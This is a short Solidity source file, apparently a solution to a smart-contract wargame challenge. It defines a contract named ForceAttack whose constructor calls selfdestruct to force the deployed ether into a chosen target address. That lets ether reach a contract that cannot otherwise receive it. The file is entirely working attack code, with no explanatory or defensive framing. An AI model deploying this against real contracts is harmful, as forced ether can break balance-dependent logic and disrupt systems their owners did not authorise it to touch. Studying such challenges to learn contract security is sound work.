// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttack {
    constructor(address payable _to) payable {
        selfdestruct(_to);
    }
}
